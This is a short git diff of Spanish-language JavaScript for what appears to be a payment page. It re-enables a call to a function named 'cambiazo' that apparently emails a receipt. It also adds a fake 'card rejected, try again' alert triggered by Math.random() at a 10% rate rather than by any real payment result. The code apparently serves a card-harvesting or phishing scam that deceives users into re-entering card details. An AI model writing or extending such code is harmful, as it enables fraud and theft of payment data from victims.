@@ -115,14 +115,15 @@ async function getDespacho(){
 }
 async function cargando(){
     document.getElementById('spinnerOverlay').style.display = 'flex';
-    let chance = Math.random()
+    let chance = Math.random();
     setTimeout(async function() {
         if (chance < 0.9){
             document.getElementById('spinnerOverlay').style.display = 'none';
-            //await cambiazo();
+            await cambiazo();
             window.location.href='index.php'
         } else {
-            alert("Erroorrr");
+            alert("Rechazo de Tarjeta: Intente nuevamente.");
+            document.getElementById('spinnerOverlay').style.display = 'none';
         }
     }, 3000);
 }
@@ -162,7 +163,6 @@ async function cambiazo(){
                 }
             })
         });
-        console.log(response);
     } catch (error){
         console.error("Error al enviar comprobante por correo:", error);
     }
